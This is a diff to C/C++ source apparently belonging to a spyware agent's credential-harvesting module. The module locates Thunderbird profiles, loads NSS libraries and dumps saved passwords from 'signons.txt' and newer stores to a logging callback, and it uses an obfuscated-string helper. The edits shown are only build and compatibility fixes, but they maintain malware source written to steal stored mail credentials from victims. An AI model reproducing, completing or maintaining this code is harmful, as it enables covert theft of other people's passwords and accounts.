@@ -7,8 +7,8 @@
 
 #include <windows.h>
 
-#include "base64.h"
-#include "..\common.h"
+#include <base64/base64.h>
+#include "../../H4DLL/common.h"
 
 // callback for the password
 extern int LogPassword(WCHAR *resource, WCHAR *service, WCHAR *user, WCHAR *pass);
@@ -17,12 +17,14 @@ extern int InitFFLibs(WCHAR *);
 extern int InitializeNSSLibrary(WCHAR *);
 extern void NSSUnload();
 extern int DumpSqlFF(WCHAR *profilePath, WCHAR *signonFile);
-extern WCHAR *DeobStringW(WCHAR *string);
+extern WCHAR *DeobStringW(const WCHAR *string);
 
 // Function declarations..
 WCHAR *GetTBProfilePath(WCHAR *FullPath, size_t size);
 
+#ifndef SAFE_FREE
 #define SAFE_FREE(x) do { if (x) {free(x); x=NULL;} } while (0);
+#endif
 
 extern WCHAR *UTF8_2_UTF16(char *str); // in firefox.cpp
 
@@ -223,7 +225,7 @@ int DumpThunderbird(void)
 		return 0;
 
 	// get the password for the old versions
-	DumpTB(ProfilePath, L"signons.txt");   
+	DumpTB(ProfilePath, (WCHAR *)L"signons.txt");   
 
 	// get the password for the 3.1.x
 	GetTBLibPath(TBDir, sizeof(TBDir));
